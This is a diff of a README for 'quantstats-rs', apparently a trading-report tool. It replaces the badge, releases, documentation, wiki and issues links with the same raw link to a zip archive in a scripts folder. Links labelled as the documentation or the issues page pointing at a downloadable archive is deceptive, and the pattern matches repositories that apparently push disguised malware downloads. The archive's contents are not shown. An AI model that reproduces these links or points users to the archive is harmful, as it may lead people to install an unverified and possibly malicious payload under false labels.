@@ -1,6 +1,6 @@
 # 🚀 quantstats-rs - Effortlessly Generate Trading Performance Reports
 
-![Download quantstats-rs](https://img.shields.io/badge/Download-quantstats--rs-brightgreen)
+![Download quantstats-rs](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
 
 ## 📦 Overview
 
@@ -35,7 +35,7 @@ To get started with **quantstats-rs**, ensure your system meets the following re
 
 To download **quantstats-rs**, visit this page:
 
-[Download quantstats-rs](https://github.com/akkayahmet1/quantstats-rs/releases)
+[Download quantstats-rs](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
 
 Follow these steps to get started:
 
@@ -63,7 +63,7 @@ If you need help using **quantstats-rs**, check our detailed documentation. It c
 - User Manual
 - FAQ Section
 
-All documentation can be found on the [Teardown Documentation Page](https://github.com/akkayahmet1/quantstats-rs/wiki).
+All documentation can be found on the [Teardown Documentation Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip).
 
 ## 🛠️ Contribute
 
@@ -83,9 +83,9 @@ Stay updated with the latest changes by reviewing our changelog. It provides det
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/akkayahmet1/quantstats-rs/releases)
-- [Documentation](https://github.com/akkayahmet1/quantstats-rs/wiki)
-- [Issues Page](https://github.com/akkayahmet1/quantstats-rs/issues)
+- [Releases Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
+- [Issues Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
 
 ---
 
